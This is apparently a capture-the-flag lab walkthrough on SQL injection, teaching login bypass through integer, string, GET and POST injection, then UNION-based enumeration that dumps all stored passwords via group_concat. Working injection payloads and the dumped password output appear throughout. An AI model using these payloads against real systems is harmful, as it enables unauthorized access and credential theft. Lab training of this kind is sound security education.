### BASIC SQL INJECTION
#### **SQL Injection 1: Input Box Non-String**

When a user logs in, the application performs the following query:

```plain
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'
```

When logging in, the user supplies input to the profileID parameter. For this challenge, the parameter accepts an integer, as can be seen here:

```plain
profileID=10
```

Since there is no input sanitization, it is possible to bypass the login by using any True condition such as the one below as the ProfileID

```plain
1 or 1=1-- -
```

Bypass the login and retrieve the flag.

#### **SQL Injection 2: Input Box String**

This challenge uses the same query as in the previous challenge. However, the parameter expects a string instead of an integer, as can be seen here:

```plain
profileID='10'
```

Since it expects a string, we need to modify our payload to bypass the login slightly. The following line will let us in:

```plain
1' or '1'='1'-- -
```

Bypass the login and retrieve the flag.

#### **SQL Injection 3: URL Injection**

This challenge uses a GET request when submitting the login form, as seen here:

[![](https://assets.tryhackme.com/additional/imgur/9RvTzkK.png)](https://assets.tryhackme.com/additional/imgur/9RvTzkK.png)

The login and the client-side validation can then easily be bypassed by going directly to this URL:

`http://10.49.141.158:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a`

The browser will automatically urlencode this for us. Urlencoding is needed since the protocol does not support all characters in the request. When urlencoded, the URL looks as follows:

`http://10.49.141.158:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a`

The %27 becomes the single quote (') character and %20 becomes a blank space.

#### **SQL Injection 4: POST Injection**

When submitting the login form for this challenge, it uses the POST method. It is possible to either remove/disable the JavaScript validating the login form or submit a valid request and intercept it with a tool such as burp or zap and modify it:

[![](https://assets.tryhackme.com/additional/imgur/LRnr2WQ.png)](https://assets.tryhackme.com/additional/imgur/LRnr2WQ.png)



### Goal

This challenge builds upon the previous challenge. Here, the goal is to find a way to dump all the passwords in the database to retrieve the flag without using blind injection.

##### Description

The login form is still vulnerable to injection, and it is possible to bypass the login by using ' OR 1=1-- - as a username.

Before dumping all the passwords, we need to identify places where results from the login query is returned within the application. After logging in, the name of the currently logged-on user is displayed in the top right corner, so it might be possible to dump the data there, as seen here:

![](https://assets.tryhackme.com/additional/imgur/Xys9X1M.png)

Data from the query could also be stored in the session cookie. It is possible to extract the session cookie by opening developer tools in the browser, which can be done by pressing F12. Then navigate to Storage and copy the value of the session cookie, as seen here:

![](https://assets.tryhackme.com/additional/imgur/hRu6pKD.png)

Then it is possible to decode the cookie at [https://www.kirsle.net/wizards/flask-session.cgi (opens in new tab)](https://www.kirsle.net/wizards/flask-session.cgi) or via a custom script. A script to decode the cookie can be downloaded inside the by going to [://10.49.141.158:5000/download/decode_cookie.py (opens in new tab)](http://10.49.141.158:5000/download/decode_cookie.py).

After having logged in with ' OR 1=1-- - as username, the decoded cookie can be seen below, and it is clear that the user id and username from the login query are placed inside it.

{

    "challenge2_user_id": 1,

    "challenge2_username": "admin"

}

It is possible to dump the passwords by using a UNION based injection. There are two key requirements that must be met for a UNION based injection to work:

- The number of columns in the injected query must be the same as in the original query
- The data types for each column must match the corresponding type

When logging in to the application, it executed the query below. From the statement, we can see that it is retrieving two columns; id and username.

SELECT id, username FROM users WHERE username = '" + username + "' AND password = '" + password + "'

Without knowing the number of columns upfront, the attacker must first enumerate the number of columns by systematically injecting queries with different numbers of columns until it is successful. For example:

 1' UNION SELECT NULL-- -

 1' UNION SELECT NULL, NULL-- -

 1' UNION SELECT NULL, NULL, NULL-- -

In this case, successful means that the application will successfully login when the correct number of columns is injected. In other cases, if error messages are enabled, a warning might be displayed saying "SELECTs to the left and right of UNION do not have the same number of result columns" when incorrect number of columns are injected.

By using ' UNION SELECT 1,2-- - as username, we match the number of columns in the original query, and the application lets us in. After logging in, we can see that the username is replaced with the integer 2, which is what we used as column two in the injected query.

![](https://assets.tryhackme.com/additional/imgur/CiqrL78.png)

The same goes for the username in the session cookie. By decoding it, we can see that the username has been replaced with the same value as above.

{

    "challenge2_user_id": 1,

    "challenge2_username": 2

}

Enumerate the database to find tables and columns, as we did under Task 2 Introduction to Injection. A cheat sheet such as [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) can be helpful for this. The challenge's objective was to dump all the passwords to get the flag, so in this case, we will guess that the column name is _password_ and that the table name is _users_. With this logic, it is possible to dump the passwords with the following code:  

' UNION SELECT 1, password from users-- -

However, the previous statement will only return one password. The [group_concat() (opens in new tab)](https://sqlite.org/lang_aggfunc.html#groupconcat) function can help achieve the goal of dumping all the passwords simultaneously.

By injecting the following code into the username field:  

' UNION SELECT 1,group_concat(password) FROM users-- -

All the passwords are dumped:

![](https://assets.tryhackme.com/additional/imgur/A98eMkg.png)

The passwords can also be retrieved by decoding the Flask session cookie:

{

    "challenge2_user_id": 1,

    "challenge2_username": "rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,{AuTh2},viking123"

}